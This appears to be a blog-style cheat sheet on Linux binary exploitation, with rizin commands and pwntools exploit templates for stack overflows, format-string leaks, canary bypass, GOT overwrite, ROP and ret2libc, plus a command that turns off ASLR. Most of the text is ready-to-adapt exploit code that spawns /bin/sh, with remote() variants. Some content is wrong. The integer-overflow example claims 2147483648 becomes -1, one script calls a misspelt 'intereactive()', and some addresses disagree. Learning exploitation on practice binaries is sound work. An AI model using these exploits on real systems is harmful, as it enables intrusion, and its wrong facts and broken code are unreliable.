---
title: Binary Exploitation
description: Binary Exploitation is the process of finding vulnerabilities in the binary file.
tags:
    - Reverse Engineering
refs:
    - https://ir0nstone.gitbook.io/notes/
date: 2023-02-02
draft: false
---

## Prerequisites

This post uses “rizin” for dynamic analysis.  
And “pwntools” python package is useful for binary exploitation.

<br />

## Investigation

### Security Properties

First check the executable properties.

```sh
checksec --file=.example
```

- **RELRO**

    - **Partial RELRO** - We can read/write the global offset table.
        
- **STACK CNARY**

    - **No canary found** - It’s vulnerable to buffer overflow.
        
- **NX**

    - **NX enabled** - We cannot execute custom shellcode from the stack.
        
- **PIE**

    - **No PIE** - The binary always starts at same address.

### ASLR (Address Space Layout Randomization) in Machine

ASLR is a security technique involved in preventing exploitation of memory corruption vulnerabilities.

```sh
cat /proc/sys/kernel/randomize_va_space
2
```

- **0** - The address space is NOT randomized.
- **1** - The address space is randomized.
- **2** - The address space is randomized, and data segment as well.

<br />

## Code Analysis

### 1. Start Debugger

```sh
# Change permission for debugging
chmod +x example

# -d: Debug mode
rizin -d example
```

### 2. Analyzing

```sh
# Analyze all calls, references, emulation and applies signatures
[0x0000]> aaa
```

### 3. List functions

```sh
# List functions
[0x0000]> afl
[0x0000]> afl | grep main
```

### 4. Disassemble & Decompile Functions

```sh
# Disassemble the function
[0x0000]> pdf @ main
[0x0000]> pd @ main
# Disassemble the first 50 lines
[0x0000]> pd 50 @ main

# Decompile the function (the ghidra plugin required)
[0x0000]> pdg @ main
```

If you want to decompile using “pdg” command as above, you need to install the “rizin-plugin-ghidra” so install it by running the following command.

```sh
sudo apt install rizin-plugin-ghidra
```

<br />

## Buffer Overflow using gets()

The gets() function in C is vulnerable to lead to overflow of buffer size.  
Run "pdf" or "pdg" command to check if the program uses gets().

```sh
rizin -d ./example
[0x0000]> aaa

# Disassemble the function
[0x0000]> pdf @ main
# An example result
call  sym.imp.gets  ; char *gets(char *s)

# Decompile the function
[0x0000]> pdg @ main
# An example result
int64_t var_4h;
sym.imp.gets(&var_4h);
```

So the file uses gets() as above, it may cause unexpected behavior.

### Exploitation

Abuse input/output by typing a lot of characters more than the program expects..

```sh
./example

Type something:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

### Exploitation using Pwntools

```python
from pwn import *

context.update(arch="amd64", os="linux")

payload = b"A" * 200

p = process('./example') # p = remote('example.com', '1337')
p.sendline(payload) # or p.send(payload + b"\n")
p.intereactive()
```

<br />

## Overwrite Variables

The program executes input/output by gets() or scanf(), and limit the buffer size of the variable, we can modify the variable then lead to unexpected behavior.  
For instance, assume the program is as follow.

```sh
rizin -d ./example
[0x0000]> aaa

# Disassemble the function
[0x0000]> pdf @ main
# An example result
sub   rsp, 0x70
call  sym.imp.__isoc99_scanf       ; int scanf(const char *format)
cmp   dword [rbp-0x4], 0xdeadbeef
jne   0x5569e8600992
lea   rdi, str.bin_sh              ; "/bin/sh"
ret
```

First find the distance from the stack pointer to rbp-0x4 (0x04).

```python
python3
>>> int(0x70-0x4)
108
```

### Exploitation using Pwntools

```python
from pwn import *

context.update(arch="amd64", os="linux")

payload = b"A" * 108
payload += p32(0xdeadbeef)

p = process('./example') # p = remote('example.com', '1337') for remote connection
p.sendline(payload)
p.interactive()
```

<br />

## Overwrite the Address of the Next Call

If the program uses get() or scanf(), we can specify the address of the desired calls by overwriting the address.

```sh
rizin -d ./example
[0x0000]> aaa

# List all functions
{0x0000]> afl
# An example result
0x0040158c  main
0x00401194  vuln_fn
```

For instance, if we want to call the “vuln_fn” function listed as above, and the program uses gets() or scanf(), we can specify the address of the next calls by overwriting the address.

```sh
# Add breakpoint to the main function
[0x0000]> db @ main
[0x0000]> dc
# Disassemble the first 50 lines (the number of lines is arbitrary)
[0x0000]> pd 50
[0x0000]> pd 50 @ main
[0x0000]> dc

Type somthing:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

### Exploitation using Pwntools

```python
from pwn import *

context.update(arch="amd64", os="linux")

elf = context.binary = ELF("./example")

payload = b"A" * 32
# Give the address of the desired function.
payload += p64(elf.sym["vuln_fn"])
# or if PIE is disabled, we can set the address directly.
# payload += p64(0x00401194)

p = process('./example') # p = remote('example.com', '1337') for remote connection.

p.sendline(payload)
p.interactive()
```

<br />

## Shellcode

We can create the crafted shell code and overwrite the address to execute the shell code.  
Use pwntools to create the shell code.

```python

from pwn import *

context.update(arch="amd64", os="linux")

payload = b"A" * 50 + b"B" * 8
payload += asm(shellcraft.sh())

p = process('./example') # p = remote('example.com', '1337') for remote connection
p.sendline(payload)
p.interactive()
```

<br />

## Integer Overflow

If the program processes integer values with input/output, we can abuse it by overflow of integer.  
The range of 32-bit integer is **-2147483647 to 2147483647**, so if we type the max value +1 in input for instance, the result is -1. This is because

```bash
./example

Type number:
>> 2147483648
The number you entered is -1.
```

<br />

## Format String (Pointer)

```sh
./example

Type something:
>> %2$p
The result is 0x555a18ae6365
```

### Exploitation Examples

```sh
# Brute force pointer
for i in {20..-1}; do echo \%$i\$p | ./example; done

# Brute force pointer & cut & hexdump (reverse) & reverse
# cut -c 15-: Select only N characters (e.g. 15 characters)
# xxd -ps: Output in plain hexdump style
# xxd -r: Reverse operation. Convert hexdump into binary
# rev: Reverse lines characterwise
(for i in {11..6..-1}; do echo \%$i\$p | ./example; done) | grep "The result is" | cut -c 15- | xxd -ps -r | rev
```

<br />

## Bypass Canary Protection

```python
from pwn import *
import re

context.update(arch="amd64", os="linux")

filepath = "./example"
elf = context.binary = ELF(filepath)

p = process(filepath) # p = remote('example.com', '1337') for remote connection

# We need to find the stack canary. This address ends with "00".
# To find it, execute p.sendline(b"%p %p %p %p ...").
p.sendline(b"%10$p %13$p")
p.recvuntil(b"result: ")
leaked = p.recvline().split()
print(leaked)
base = int(leaked[0], 16) - 0xa90
canary = int(leaked[1], 16)
elf.address = base

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(base + 0x6fe)
payload += p64(elf.sym["target_func"])

p.sendline(payload)
p.interactive()
```

<br />

## GOT Overwrite

GOT (Global Offset Table) is a section of a computer program’s memory used to enable computer program code compiled as an ELF file to run correctly.

```python
from pwn import *

context.update(arch="amd64", os="linux")

filepath = "./example"

elf = context.binary = ELF(filepath)

p = process(filepath)  # p = remote('example.com', '1337')

p.clean()
p.sendline()
p.clean()

payload = fmtstr_payload(10, {elf.got['puts'] : elf.sym['holidays']})
p.sendline(payload)
p.interactive()
```

<br />

## ROP

[ROPgadget](https://github.com/JonathanSalwan/ROPgadget) lets you search your gadgets on your binaries to facilitate your ROP exploitation.

```python
from pwn import *

context.update(arch="amd64", os="linux")

filepath = "./example"

p = process(filepath)
#p = remote('example.com', '1337')

payload = flat(
    b'A'*40,

    # Generated by `ROPgadget --binary example --ropchain`
    # Paste the output
)

p.clean()
p.sendline(payload)

p.interactive()
```

<br />

## ret2libc

It refers to [this post](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc) .

### 1. ASLR Bypass

First check the ASLR in the machine.

```bash
cat /proc/sys/kernel/randomize_va_space
```

If we get **“2”** as the result, the machine randomizes the address space so we cannot find the address of the system function. That’s why we need to bypass ASLR to find the address of the function in libc.

To disable ASLR, run the following command if we can (because it requires sudo).

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### 2. Find libc in the Binary

```bash
ldd ./example

# Result examples
linux-vdso.so.1 (0x00007ffff7ffa000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
```

For instance, we found the libc.so.6 and the base address of libc is 0xf7dc2000 .

### 3. Find the Location of  libc

```bash
# -s: Display the symbols
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

# Result
1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

### 4. Find the Location of /bin/sh

```bash
# -a: All scan
# -t x: Print the location of the string in hex (x) 
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

# Result
1b3e1a /bin/sh
```

### 5. Exploit

Replace the values of libc_base, system, binsh with the values which we found in the previous sections.

- **32-bit**

    ```python
    from pwn import *

    p = process('./example')

    libc_base = 0xf7dc2000
    system = libc_base + 0x4f550
    binsh = libc_base + 0x1b3e1a

    payload = b'A' * 76         # The padding
    payload += p32(system)      # Location of system
    payload += p32(0x0)         # return pointer - not important once we get the shell
    payload += p32(binsh)       # pointer to command: /bin/sh

    p.clean()
    p.sendline(payload)
    p.interactive()
    ```

- **64-bit**

    In 64-bit, we need to find the address of ‘pop rdi ; ret’ using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) .

    ```bash
    ROPgadget --binary ./example | grep rdi

    # Result
    0x00000000004007f3 : pop rdi ; ret
    ```

    In some cases, we might need to the return address for paddings.

    ```python
    objdump -d ./example | grep ret

    # Result
    400556:	c3                   	retq
    ```

    Finally our script is below:

    ```python
    from pwn import *

    p = process('./example')

    libc_base = 0x7ffff7de2000
    system = libc_base + 0x4f550
    binsh = libc_base + 0x1b3e1a

    POP_RDI = 0x4007f3

    payload = b'A' * 72         # The padding
    # payload += p64(0x400556)    # Extra paddings
    payload += p64(POP_RDI)     # gadget -> pop rdi; ret
    payload += p64(binsh)       # pointer to command: /bin/sh
    payload += p64(system)      # Location of system
    payload += p64(0x0)         # return pointer - not important once we get the shell

    # If we need to input in multiple prompts, 
    # p.clean()
    # p.sendline("1") e.g. "Select the menu:"
    p.clean()
    p.sendline(payload)
    p.interactive()
    ```

<br />

## ret2plt

Coming soon.